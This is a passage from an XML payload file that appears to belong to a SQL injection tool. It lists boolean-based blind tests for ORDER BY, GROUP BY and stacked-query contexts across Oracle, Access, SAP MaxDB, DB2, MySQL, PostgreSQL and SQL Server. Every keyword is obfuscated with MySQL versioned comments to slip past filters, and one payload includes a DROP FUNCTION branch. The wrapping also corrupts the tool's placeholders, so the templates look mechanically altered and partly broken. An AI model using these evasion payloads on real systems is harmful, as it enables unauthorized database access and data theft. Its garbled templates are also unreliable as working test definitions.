            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,/*!50000IIF/**_**/*/([/*!50000INFERENCE/**_**/*/],/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</vector>
        <request>
            <payload>,/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,/*!50000IIF/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</vector>
        <request>
            <payload>,/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>SAP MaxDB</dbms>
        </details>
    </test>

    <test>
        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>SAP MaxDB</dbms>
        </details>
    </test>

    <test>
        <title>IBM DB2 boolean-based blind - ORDER BY clause</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>IBM DB2</dbms>
        </details>
    </test>

    <test>
        <title>IBM DB2 boolean-based blind - ORDER BY clause (original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>IBM DB2</dbms>
        </details>
    </test>

    <!-- Works in MySQL, Oracle, etc. -->
    <test>
        <title>HAVING boolean-based blind - WHERE, GROUP BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2</clause>
        <where>1</where>
        <vector>/*!50000HAVING/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000HAVING/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
        </request>
        <response>
            <comparison>/*!50000HAVING/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>
    <!-- End of boolean-based blind tests - ORDER BY, GROUP BY clause -->

    <!-- Boolean-based blind tests - Stacked queries -->
    <test>
        <title>MySQL &gt;= 5.0 boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &lt; 5.0 boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&lt; 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/)</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
    <test>
        <title>PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000IF/**_**/*/([/*!50000INFERENCE/**_**/*/]) /*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ [/*!50000RANDSTR/**_**/*/]</vector>
        <request>
            <payload>;/*!50000IF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ [/*!50000RANDSTR/**_**/*/]</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;/*!50000IF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ [/*!50000RANDSTR/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/)</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000IIF/**_**/*/([/*!50000INFERENCE/**_**/*/],/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</vector>
        <request>
            <payload>;/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</payload>
            <comment>%/*!5000016/**_**/*/</comment>
        </request>
        <response>
            <comparison>;/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>SAP MaxDB boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</comparison>
        </response>
        <details>
            <dbms>SAP MaxDB</dbms>
        </details>
    </test>
    <!-- End of boolean-based blind tests - Stacked queries -->
</root>
